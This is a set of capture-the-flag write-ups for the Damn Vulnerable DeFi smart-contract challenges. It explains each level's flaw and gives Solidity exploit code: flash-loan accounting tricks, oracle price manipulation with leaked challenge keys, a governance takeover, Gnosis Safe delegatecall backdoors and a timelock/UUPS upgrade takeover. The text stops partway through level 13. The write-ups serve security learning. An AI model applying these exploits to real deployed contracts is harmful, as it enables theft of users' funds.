# Write Ups

<!-- MarkdownTOC levels="1,2" autolink="true" -->

- [01 Unstoppable](#01-unstoppable)
- [02 Naive Receiver](#02-naive-receiver)
- [03 Truster](#03-truster)
- [04 Side Entrance](#04-side-entrance)
- [05 The Rewarder](#05-the-rewarder)
- [06 Selfie](#06-selfie)
- [07 Compromised](#07-compromised)
- [08 Puppet](#08-puppet)
- [09 Puppet V2](#09-puppet-v2)
- [10 Free Rider](#10-free-rider)
- [11 Backdoor](#11-backdoor)
- [12 Climber](#12-climber)
- [13 Wallet Mining](#13-wallet-mining)
- [14 Puppet V3](#14-puppet-v3)

<!-- /MarkdownTOC -->

## 01 Unstoppable

To beat this level, we need to comply with

```solidity
vm.startPrank(someUser);

vm.expectRevert();
receiverContract.executeFlashLoan(100e18);

vm.stopPrank();
```

That is, prevent `someUser` to perform a Flash Loan. In other words, a Denial of Service on the Vault.

NOTE: This user already created an instance of the `ReceiverUnstoppable` contract at the setup.

### Solution

#### Notes on `UnstoppableVault`

* `UnstoppableVault` is an [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626) Tokenized Vault, implementing a Flash Loan by [ERC-3156](https://eips.ethereum.org/EIPS/eip-3156).
* Its underlying token is `DVT`, its shares are the `oDVT` token.
* The flash loan lends `DVT`.

#### Notes on the `totalAssets()` implementation

While this analysis doesn't add to the solution, it is worth looking at the assembly code at `totalAssets()`:

```solidity
assembly { // better safe than sorry
    if eq(sload(0), 2) {
        mstore(0x00, 0xed3ba6a6)
        revert(0x1c, 0x04)
    }
}
```

Is a reentrancy control.

* `UnstoppableVault` inherits from `IERC3156FlashLender`, `ReentrancyGuard`, `Owned`, and `ERC4626`.
* While `IERC3156FlashLender` does not have any variable, `ReentrancyGuard` has `uint256 private locked = 1`, therefore, slot 0 will be the value of `locked`, unless the modifier `nonReentrant()` is used.
* This function performs an additional check over this value:
  * It loads slot 0, and compares its value with `2`
  * If slot 0 is equal 2, then it will store in memory position `0x00` the `Reentrant()` function selector `0xed3ba6a6`
  * Then it will revert, with the value `0xed3ba6a6`.
  * To explain why `revert()` uses the `0x1c`, look at the 32 bytes of memory from position `0x00`:
    * `0x00000000000000000000000000000000000000000000000000000000ed3ba6a6`
    * There, it can be noticed that the value starts at position `0x1c`.

#### Notes on `UnstoppableVault.flashLoan()`

Notice the following guard:

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

`convertToShares` will take the given **assets** (underlying token) and compute the amount of **shares**.

As it can be seen that `balanceBefore` is a measure of the **assets** in the vault, then there is a problem of units we can leverage.

#### Leveraging the implementation error

Since `(convertToShares(totalSupply)` is `total shares * (total shares / total assets)`, and this quantity has to be equal to `total assets` (`balanceBefore`), it follows that if we manage to make the total of shares different to the total of assets, we would make the guard fail, preventing flash loans to work.

How do we pertub this ratio? We cannot mint or burn shares without `deposit` or `withdraw`. What we can do instead is incrementing the amount of the underlying asset (`DVT`) in the vault, with a simple `transfer()`.

```solidity
token.transfer(address(level.vault()), 1);
```

By transfering a single `DVT` token, the values checked at the guard will be different, breaking the flash loan.

### References

* https://eips.ethereum.org/EIPS/eip-4626
* https://ethereum.org/es/developers/docs/standards/tokens/erc-4626/
* https://eips.ethereum.org/EIPS/eip-3156

## 02 Naive Receiver

To beat this level, we need to comply with

```solidity
assertEq(address(receiver).balance, 0);
assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
```

In other words: Drain the receiver, putting its funds in the pool.

### Solution

The fees of the pool are notably high

```solidiy
uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
```

And the `flashLoan()` function doesn't control for the caller

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != ETH)
        revert UnsupportedCurrency();

    uint256 balanceBefore = address(this).balance;

    // Transfer ETH and handle control to receiver
    SafeTransferLib.safeTransferETH(address(receiver), amount);
    if(receiver.onFlashLoan(
        msg.sender,
        ETH,
// ....
```

Let's just borrow on behalf of the receiver, then 😈

```solidity
IPool pool = IPool(address(level.pool()));
address receiverAddr = address(level.receiver());

for (uint8 i = 0; i < 10; i++) {
  pool.flashLoan(receiverAddr, level.pool().ETH(), address(pool).balance, "0x");
}
```

### References

* https://eips.ethereum.org/EIPS/eip-3156

## 03 Truster

To beat this level, we need to comply with

```solidity
// did we drain the pool?
assertEq(token.balanceOf(msg.sender), TOKENS_IN_POOL);
assertEq(token.balanceOf(address(pool)), 0);
```

### Solution

Notice that `TrusterLenderPool.flashLoan` executes any function at _any target_ for you

```solidity
target.functionCall(data);
```

We set an approval to receive all the tokens after we perform a flash loan then

```solidity
// tell the pool in the custom function to approve a transfer to us
bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), TOKENS_IN_POOL);
```

One question during the analysis of this problem was "_But then, how do we give the funds back to the loan, while we plant the approval?_". Fortunately,

1. the pool doesn't control for loans of `0` tokens nor charge fees, so we don't need to equip a mechanism to give funds back.
2. ERC20's `transfer` doesn't fail when the `amount` is 0.

We issue the flash loan of 0, and then take the funds.

```solidity
// the pool doesn't control for a loan of 0 tokens, nor charges a fee.
// hence, we don't need to prepare a callback to give it funds back.
pool.flashLoan(
  0,
  address(this),
  address(token),
  data
);

// with our approval planted, we just take the funds
token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
```

### Reference

* https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-

## 04 Side Entrance

To beat this level, we need to comply with

```solidity
// did we drain the pool?
assertEq(msg.sender.balance, PLAYER_INITIAL_ETH_BALANCE + ETHER_IN_POOL);
assertEq(address(pool).balance, 0);
```

### Solution

If we make a flash loan, and `deposit()` the funds two things happen:

1. We comply with `(address(this).balance < balanceBefore)`, so the flash loan won't revert.
2. At `deposit()`, This `balances[msg.sender] += msg.value` will execute.

As `withdraw()` only checks the `balances[]` mapping, we will get the amount recorded there.

The solution then is

```solidity
function attack() external {
  // we borrow the funds, the flashLoan() function will
  // call execute() and we deposit() these funds in there,
  // incrementing our balance in the pool.
  pool.flashLoan(1_000 ether);

  // as withdraw() only checks the balances[] mapping,
  // we will get the amount recorded there.
  pool.withdraw();

  // pass the funds to the player
  (bool success,) = msg.sender.call{value: 1_000 ether}("");
  success;
}

function execute() external payable {
  pool.deposit{value: msg.value}();
}
```

Implement `receive() external payable {}` in your contracts.

### References

* https://solidity-by-example.org/hacks/re-entrancy/

## 05 The Rewarder

To beat this level, we need to comply with

```solidity
// Users should get neglegible rewards this round
// ...

// Rewards must have been issued to the player account
// ...

// The amount of rewards earned should be close to total available amount
// ...

// Balance of DVT tokens in player and lending pool hasn't changed
// ...
```

Also, this happens at round 3: `assertEq(rewarderPool.roundNumber(), 3)`.

### Solution

Round number will change at `_recordSnapshot()` (provided the 5 days have passed from last round), and this function only gets triggered at the constructor and `distributeRewards()`.

We can leverage a flash loan of the accounting token to get all the funds we can, deposit them into the pool, trigger `distributeRewards()` to increase the round number, and withdrawing the funds after we get the reward.

```solidity
function attack() public {
  // borrow all the DVT you can get
  // the flow continues at receiveFlashLoan()
  flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));

  // give the reward to the player, to beat the level
  rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
}

function receiveFlashLoan(uint256 amount) public {
  // deposit the DVT into the rewarderPool
  liquidityToken.approve(address(rewarderPool), amount);
  rewarderPool.deposit(amount);

  // trigger this to get rewards, and increment the round number
  rewarderPool.distributeRewards();

  // got the rewards, get the DVT back
  rewarderPool.withdraw(amount);

  // pay back the flash loan
  liquidityToken.transfer(msg.sender, amount);
}
```

### References

* https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot

## 06 Selfie

To beat this level, we need to comply with

```solidity
assertEq(token.balanceOf(msg.sender), TOKENS_IN_POOL);
assertEq(token.balanceOf(address(pool)), 0);
```

In other words: Drain the pool, get all the funds.

### Solution

* The function `emergencyExit()` can drain the pool, but has the `onlyGovernance` modifier.

* The `onlyGovernance` modifier controls that only the `SimpleGovernance` contract executes this function.
  * We can add this function at `queueAction()` so `executeAction()` will invoke it.

* Now, `queueAction()` asks you to have enough votes (`hasEnoughVotes(msg.sender)`).
  * To have the votes, you need to have enough of the contract's `_governanceToken`, which is the same `token` of the pool. That is, we can just take a flash loan, issue a `snapshot()`, and get the majority of votes.
  * After we run the `snapshot()`, we can deliver the payload.

* Because `executeAction()` will ask for a minimum `ACTION_DELAY_IN_SECONDS` of `2 days`, we would have to wait IRL for that time to execute the attack. We just pretend we do with `vm.warp(block.timestamp + 2 days)`. Also we would get the `actionId` by inspecting the `ActionQueued` event log.

Putting everything together, we have

```solidity
function onFlashLoan(
      address,
      address,
      uint256 amount,
      uint256,
      bytes calldata
  ) external returns (bytes32) {
  // since this implements DamnValuableTokenSnapshot,
  // we can just issue a snapshot.
  // as we were able to borrow the maximum of the pool,
  // we will get the majority of the votes.
  governanceToken.snapshot();

  // prepare the payload
  bytes memory data = abi.encodeWithSelector(
    ISelfiePool.emergencyExit.selector,
    player
  );

  // deliver the payload
  governance.queueAction(
    address(pool),
    0,
    data
  );

  // return the funds
  token.approve(msg.sender, amount);
  return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// .... wait for 2 days ....
// then:

function attack() public {
  // IRL we would obtain this id parameter by inspecting
  // the log of the ActionQueued event.
  governance.executeAction(1);
}
```

### References

* https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot

## 07 Compromised

To beat this level, we need to comply with

```solidity
// drain the exchange
assertEq(address(exchange).balance, 0);
assertGt(msg.sender.balance, EXCHANGE_INITIAL_ETH_BALANCE);

// player doesn't own any NFT
assertEq(nftToken.balanceOf(msg.sender), 0);
// median price doesn't vary
assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
```

### Solution

We can beat the level if we manage to sell an NFT to the exchange at 999 ETH. The problem being, how do we get one in the first place.

If we look at the set up of the oracle, we see that the sources are

```solidity
address[] memory sources = new address[](3);
sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
```

And, that at the definition of the level [at damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/challenges/compromised/) we read

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:

```bash
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

These two hex strings are base64 representations of 32 bytes numbers ([here](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjggNmEgNGUgNmEgNjMgMzQgNWEgNTcgNTkgNzggNTkgNTcgNDUgMzAgNGUgNTQgNWEgNmIgNTkgNTQgNTkgMzEgNTkgN2EgNWEgNmQgNTkgN2EgNTUgMzQgNGUgNmEgNDYgNmIgNGUgNDQgNTEgMzQgNGYgNTQgNGEgNmEgNWEgNDcgNWEgNjggNTkgN2EgNDIgNmEgNGUgNmQgNGQgMzQgNTkgN2EgNDkgMzEgNGUgNmEgNDIgNjkgNWEgNmEgNDIgNmEgNGYgNTcgNWEgNjkgNTkgMzIgNTIgNjggNWEgNTQgNGEgNmQgNGUgNDQgNjMgN2EgNGUgNTcgNDUgMzU) and [here](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjcgNzkgNGQgNDQgNjcgNzkgNGUgNDQgNGEgNmEgNGUgNDQgNDIgNjggNTkgMzIgNTIgNmQgNTkgNTQgNmMgNmMgNWEgNDQgNjcgMzQgNGYgNTcgNTUgMzIgNGYgNDQgNTYgNmEgNGQgNmEgNGQgMzEgNGUgNDQgNjQgNjggNTkgMzIgNGEgNmMgNWEgNDQgNmMgNjkgNWEgNTcgNWEgNmEgNGUgNmEgNDEgN2EgNGUgN2EgNDYgNmMgNGYgNTQgNjcgMzMgNGUgNTcgNWEgNjkgNTkgMzIgNTEgMzMgNGQgN2EgNTkgN2EgNGUgNDQgNDIgNjkgNTkgNmEgNTEgMzQK))

```
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

We can verify that the private keys are the ones of two trusted sources:

```bash
cast wallet address --private-key 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
# 0xe92401A4d3af5E446d93D11EEc806b1462b39D15

cast wallet address --private-key 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
# 0x81A5D6E50C214044bE44cA0CB057fe119097850c

```

In other words, we can just `oracle.postPrice("DVNFT", 0);` for each of these sources, then being able to buy an NFT from the exchange for 1 wei.

Putting all together:

```solidity
function attack(Vm vm) public {
  // we got the private keys from the intercepted message
  // IRL we use a script with the given keys instead of `vm.startPrank()`
  vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
  oracle.postPrice("DVNFT", 0);
  vm.stopPrank();

  vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
  oracle.postPrice("DVNFT", 0);
  vm.stopPrank();

  // this function will call onERC721Received() below
  exchange.buyOne{value: 1 wei}();

  // returning to the price it was, so we can drain the exchange
  vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
  oracle.postPrice("DVNFT", 999000000000000000000);
  vm.stopPrank();

  vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
  oracle.postPrice("DVNFT", 999000000000000000000);
  vm.stopPrank();

  // let's sell this token
  token.approve(address(exchange), tokenId);
  exchange.sellOne(tokenId);

  // give the money to the player to beat the level
  (bool success,) = msg.sender.call{value: address(this).balance}("");
  success;
}
```

### References

* https://eips.ethereum.org/EIPS/eip-721
* https://ethereum.org/en/developers/docs/standards/tokens/erc-721/
* https://docs.openzeppelin.com/contracts/4.x/api/token/erc721
* https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable

## 08 Puppet

To beat this level, we need to comply with

```solidity
// In the challenge written in hardhat we checked that the
// attacker did everything in one single transaction.
// we omit this check in forge.

// player has taken all tokens from the pool
assertEq(token.balanceOf(address(lendingPool)), 0);
assertEq(token.balanceOf(msg.sender), POOL_INITIAL_TOKEN_BALANCE);
```

In forge, save few exceptions, we do the attacks in a single transaction.

### Solution

We need to find a way to borrow cheap the 100_000 tokens, notice that the price used in the loan is computed with

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

By decreasing the amount of ETH and decreasing the amount of DVT in the uniswap exchange, we can lower the oracle price. As we have 1_000 DVTs we can engage in a swap of DVT for ETH with `tokenToEthSwapInput()`. We will then, have the required amount of ETH to be able to borrow the DVT from the pool and beat the level.

```solidity
token.approve(address(uniswapExchange), 1000e18);
uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);

lendingPool.borrow
  {value: lendingPool.calculateDepositRequired(100_000e18)}
    (100_000e18, address(this));
```

### References

* https://docs.uniswap.org/contracts/v1/overview
* https://docs.uniswap.org/contracts/v1/reference/interfaces
* https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy

## 09 Puppet V2

To beat this level, we need to comply with

```solidity
// Player has taken all tokens from the pool
assertEq(token.balanceOf(address(lendingPool)), 0);
assertGe(token.balanceOf(msg.sender), POOL_INITIAL_TOKEN_BALANCE);
```

### Challenge Setup Notes

#### Issue referencing created pairs

* The function `pairFor()` at `UniswapV2Library.sol` uses a init code hash.
* Some initial investigation points that this happens due to be working on a testnet.

* Solution was just copy the library files we needed into the `puppet-v2` challenge's directory sources, and modify that line, computing the new init code hash from the function `UniswapV2Factory.createPair()`.

* Some reference links
  * https://github.com/Uniswap/v2-core/issues/102
  * https://ethereum.stackexchange.com/questions/88075/uniswap-addliquidity-function-transaction-revert

* Getting the new init code hash in place (at `utils/uniswap-v2/v2-periphery/contracts/libraries/UniswapV2Library.sol`):

```solidity
  function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
      (address token0, address token1) = sortTokens(tokenA, tokenB);
      pair = address(uint(keccak256(abi.encodePacked(
              hex'ff',
              factory,
              keccak256(abi.encodePacked(token0, token1)),
             // New hash computed at the function UniswapV2Factory.createPair()
              //
              //   import "forge-std/Console.sol";
              //
              //   console.logBytes32(keccak256(abi.encodePacked(bytecode)));
              //   // (just after the line)
              //
              //   bytes memory bytecode = type(UniswapV2Pair).creationCode;
              //
              // This bytecode varies based on factors like the smart contract's
              // filetype, so if you plan to use your custom Uniswap v2 code,
              // be prepared to encounter this situation.
              hex'9d177c45a5041605b37e4e3fc753594ee3be8109195c6510bcec0cd6ca36ae48'
          ))));
  }
```

* The root cause is likely that solidity adds a hash of the filepath add the end of the bytecode when compiling.

#### Avoiding solidity version errors

The folowing code allows for the compilation and deploying of uniswap v2 code avoiding version conflicts

```solidity
// Deploy Uniswap Factory and Router
// why with deployCode() you ask?
// To avoid problems with the version police!
uniswapFactory = IUniswapV2Factory(
  deployCode(
    "out/UniswapV2Factory.sol:UniswapV2Factory",
    abi.encode(0x0000000000000000000000000000000000000000)));
uniswapRouter = IUniswapV2Router01(
  deployCode(
    "out/UniswapV2Router02.sol:UniswapV2Router02",
    abi.encode(
      address(uniswapFactory),
      address(weth)
    )));
```

### Solution

We need to lower the cost of the token, then use our ETH to borrow the whole pool.

Let's send all of the token we have been assigned at the challenge to the uniswap exchange

```solidity
token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);
uniswapRouter.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp + 1);
```

We will receive ETH, so let's implement `receive()` at our attacking smart contract.

Next, just borrow using your initial amount plus the ETH you received. Notice that it is required to wrap the ETH and make it available for transfer.

```solidity
uint256 weth_required = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
weth.deposit{value: weth_required}();
weth.approve(address(lendingPool), weth_required);
```

### References

* https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensforeth
* https://github.com/transmissions11/solmate/blob/main/src/tokens/WETH.sol


## 10 Free Rider

To beat this level, we need to comply with

* The devs extract all NFTs from its associated contract
* Exchange must have lost NFTs and ETH
* Player must have earned all ETH

```solidity
// The devs extract all NFTs from its associated contract
vm.startPrank(devs);
for (uint tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
  nft.transferFrom(address(devsContract), address(devs), tokenId);
  assertEq(nft.ownerOf(tokenId), address(devs));
}
vm.stopPrank();

// Exchange must have lost NFTs and ETH
assertEq(marketplace.offersCount(), 0);
assertLt(address(marketplace).balance,
  MARKETPLACE_INITIAL_ETH_BALANCE);

// Player must have earned all ETH
assertGt(address(msg.sender).balance, BOUNTY);
assertEq(address(devsContract).balance, 0);
```

### Solution

When `buyMany()` is invoked, all the checks happen at `_buyOne()`.

Suppose we create an order of buying tokens `[0, 1, 2]`, each of value 1 ETH.
We test our order sending as `msg.value`, 1 ETH. This is what happens.

`_buyOne()` checks:

* if `msg.value < priceToPay`, it errs `InsufficientPayment`.
  * Notice that it compares _all the value we sent_ against the price of the asset.
  * Meaning that in our example, we would have passed this check.

Now comes the transfer itself

```solidity
// transfer from seller to buyer
DamnValuableNFT _token = token; // cache for gas savings
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller using cached token
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

The contract will transfer the `tokenId` NFT to the sender, and contrary to what the
commentary says, it is not the _seller_ the one receiving the funds: Once the transfer
of the NFT is complete above, it is the _sender_ the one returned by `_token.ownerOf(tokenId)`.

In other words, the sender of the contract would receive both the NFT and the sent funds.
Allowing the attacker to gain the three NFTs of the example, reusing the sent funds and
recovering them at the end.

##### Summary of the solution

* Prepare the order with the `tokenIds` `[0, 1, 2, 3, 4, 5]` for `15 ETH`.
* Leverage the flash loan feature of the deployed Uniswap v2 pool to access these funds.
* Send the obtained NFTs to the recovery contract and pocket the bounty.

### References

* https://eips.ethereum.org/EIPS/eip-721
* https://docs.openzeppelin.com/contracts/2.x/api/token/erc721
* https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
* https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol
* https://solidity-by-example.org/defi/uniswap-v2-flash-swap/

## 11 Backdoor

To beat this level, we need to comply with

* Each user must have registered a wallet.
* Each user is no longer registered as a beneficiary.
* The balance of the `player` address is 40e18.

```solidity
// User must have registered a wallet
address wallet = walletRegistry.wallets(users[i]);
assertNotEq(wallet, address(0));

// User is no longer registered as a beneficiary
assertFalse(walletRegistry.beneficiaries(users[i]));

assertEq(token.balanceOf(playerAddress), AMOUNT_TOKENS_DISTRIBUTED);
```

### Solution

OpenZeppelin [reported in 12.MAR.2020](https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets) about the risks of enabling a DELEGATECALL to an arbitrary contract in the Gnosis Safe.

Once set up, the created wallet is designed to receive a token transfer. However, a vulnerability arises as anyone, including potential attackers, can set up this wallet on behalf of the user, enabling them to earn these tokens during the callback of the creation process. The attack strategy involves crafting a contract with a function that contains the `token.approve(address,uint256)` function.

```solidity
// The attacker contract
contract Attacker {
  function setApproval(DamnValuableToken token, address playerAddress) public {
    token.approve(playerAddress, 10 ether);
  }
}

// The initializer
bytes memory initializer = abi.encodeWithSelector(
  GnosisSafe.setup.selector,
  owners,
  uint256(1),               // threshold, has to be 1.
  address(attacker),        // address for the delegatecall.
  abi.encodeWithSignature(
    "setApproval(address,address)",
    level.token(),
    address(this)
  ),                        // data for the delegatecall.
  address(0),               // fallbackHandler, has to be 0.
  address(0),               // paymentToken, no use here.
  uint256(0),               // payment value, no use here.
  address(0)                // paymentReceiver, no use here.
);

// We set the initializer into the call to create the wallet
GnosisSafeProxyFactory(level.walletFactory())
  .createProxyWithCallback(
    address(level.masterCopy()),
    initializer,
    uint256(0x42),
    IProxyCreationCallback(level.walletRegistry())
  );
```

After the wallets are created, the attacker simply issues a transfer.

```solidity
for (uint8 i = 0; i < users.length; i++) {
  DamnValuableToken(level.token()).transferFrom(
    level.walletRegistry().wallets(users[i]),
    level.playerAddress(),
    10 ether
  );
}
```

### References

* https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets

## 12 Climber

To beat this level, we need to comply with

* Vault is drained, and the player got all its funds.

```solidity
assertEq(token.balanceOf(address(vault)), 0);
assertEq(token.balanceOf(playerAddress), VAULT_TOKEN_BALANCE);
```

### Solution

* We notice that the owner of the `vault` is the instance of the `ClimberTimelock` contract.
* The `ClimberTimelock` contract has a function `execute()` that can be called by everybody. However, it will only execute the given commands by checking from an "operation id" that is computed from the parameters that its status is `OperationState.ReadyForExecution`.
* To be `ReadyForExecution`, we need to pass the same parameters to the contract `schedule()` function. This function requires the `PROPOSER_ROLE`. Also, the operation won't be ready until we set the `delay` variable to `0`.
* On the side of the `ClimberVault` contract, while there is a `sweeper` role, there is not a clear way to set it nor enable it. Since we could leverage the owner privileges with the `execute()` function, however, we can just upgrade the contract to one which initialization gives a `transfer` to the player.
* Then, the solution of the level is built the following way:
* Leverage the `execution()` function with 4 commands:
* First, we give the `PROPOSER_ROLE` to an `AttackerSchedule` contract.

```solidity
contract AttackerSchedule {
  address timelockAddress;
  bytes payload;

  constructor(address _timelockAddress) {
    timelockAddress = _timelockAddress;
  }

  function setSchedule() external {
    (bool success,) = timelockAddress.call(payload);
      success;
  }

  function setPayload(bytes memory _payload) external {
    payload = _payload;
  }
}
```

```solidity
targets[0] = address(timelock);
values[0] = 0;
dataElements[0] = abi.encodeWithSignature(
  "grantRole(bytes32,address)",
  PROPOSER_ROLE,
  address(attackerSchedule)
);
```

* Then, we upgrade the `ClimberVault` instance by an instance of `AttackerVault`.

```solidity
contract AttackerVault is UUPSUpgradeable {
  function initialize(address tokenAddress, address playerAddress) public {
    DamnValuableToken token = DamnValuableToken(tokenAddress);
    uint256 balance = token.balanceOf(address(this));

    DamnValuableToken(tokenAddress).transfer(playerAddress, balance);
  }

  // Function required by the interface.
  function _authorizeUpgrade(address newImplementation) internal override {}
}
```

```solidity
targets[1] = address(level.vault());
values[1] = 0;
dataElements[1] = abi.encodeWithSignature(
  "upgradeToAndCall(address,bytes)",
  address(attackerVault),
  abi.encodeWithSignature(
    "initialize(address,address)",
    address(level.token()),
    level.playerAddress()
  )
);
```

* We update the `delay` to `0` so this operation is marked as `ReadyForExecution`.

```solidity
targets[2] = address(timelock);
values[2] = 0;
dataElements[2] = abi.encodeWithSignature(
  "updateDelay(uint64)",
  0
);
```

* Finally, the `AttackerSchedule` instance, having received the parameters to be sent to `execute()`, will call `schedule()` to update the status of the operation. Notice that these two steps can be done in either order, as `execute()` has not being invoked.

```solidity
targets[3] = address(attackerSchedule);
values[3] = 0;
dataElements[3] = abi.encodeWithSignature(
  "setSchedule()"
);

bytes memory payload = abi.encodeWithSignature(
  "schedule(address[],uint256[],bytes[],bytes32)",
  targets,
  values,
  dataElements,
  salt
);
attackerSchedule.setPayload(payload);
```

* Calling `execute()` will transfer the funds to the `playerAddress`, completing the challenge.

```solidity
timelock.execute(targets, values, dataElements, salt);
```

### References

* https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-
* https://eips.ethereum.org/EIPS/eip-1822
* https://docs.openzeppelin.com/contracts/5.x/api/access

## 13 Wallet Mining

To beat this level, we need to comply with:

* Be able to deploy code at the given addresses.
* Drain the given deposit address and the wallet deployer contract into the player's account.

```solidity
// Factory account must have code
assertTrue(address(walletDeployer.fact()).code.length > 0);

// Master copy account must have code
assertTrue(address(walletDeployer.copy()).code.length > 0);

// Deposit account must have code
assertTrue(DEPOSIT_ADDRESS.code.length > 0);

// The deposit address and the Safe Deployer contract must not hold tokens
assertEq(token.balanceOf(DEPOSIT_ADDRESS), 0);
assertEq(token.balanceOf(address(walletDeployer)), 0);

// Player must own all tokens
assertEq(
  token.balanceOf(playerAddress),
  initialWalletDeployerTokenBalance + DEPOSIT_TOKEN_AMOUNT);
```

### Solution

Goals can be summarized as

* Drain the deposit address `0x9B6fb6`.
  * Deploy the Gnosis Safe `0x76E2cF` at this chain via replay attack.
  * Deploy the master copy `0x34CfAC` at this chain via replay attack.
  * Generate a wallet from a custom contract with the address `0x9B6fb6`.

* Drain the walletDeployer contract.
  * Take ownership of the proxy's implementation contract.
  * Exploit `upgradeToAndCall` to destroy this contract.
  * Call walletDeployer's `drop` to drain it.

#### Drain the deposit address 0x9B6fb6.

The first task involves draining the funds from the address `0x9B6fb606A9f5789444c17768c6dFCF2f83563801`. The funds were initially transferred to this empty address. It is assumed that this address was intended to be a Gnosis Safe wallet that has not yet been deployed. The Gnosis Safe Factory, which should be located at `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`, is also not deployed.

The initial step in resolving this issue involves examining the address on Etherscan, we find the deployer, which in etherscan is identified as "Safe: Deployer 3". There, in etherscan, there is the raw transaction of the deployment of the factory. Pre EIP-155 we could just replay the transaction in other networks, which is what happened at Optimism with Gnosis Safe.

In this exercise, we will just leverage the found deployer address to deploy the factory and the master copy. The latter is a requirement to solve the level. Notice that we don't need to use the Gnosis Proxy, but we will be using a custom contract to be able to drain the funds.

```solidity
address gnosisDeployer = 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;
vm.startPrank(gnosisDeployer);
```

Now, by analyzing the transaction history of the deployer address on Etherscan, the nonces for each relevant address are identified as follows: the nonce for `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F` is `0`, and for `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`, it is `2`. With the factory now set, the next step involves deploying an attacking wallet.

```solidity
attacker = new AttackerWallet();
vm.setNonce(gnosisDeployer, 2);
factory = new GnosisSafeProxyFactory();
```

The attacker wallet, just a facilitator for the ERC-20 transfer to be in place.

```solidity
contract AttackerWallet {
  function transfer(address token, address to, uint256 amount) external {
    IERC20(token).transfer(to, amount);
  }
}
```

The deployment of a custom contract as a wallet is made feasible because the `GnosisSafeProxyFactory.sol` function `createProxy()` employs the `CREATE` opcode. This opcode generates a new address using only the keccak256 hash of the sender and nonce values.

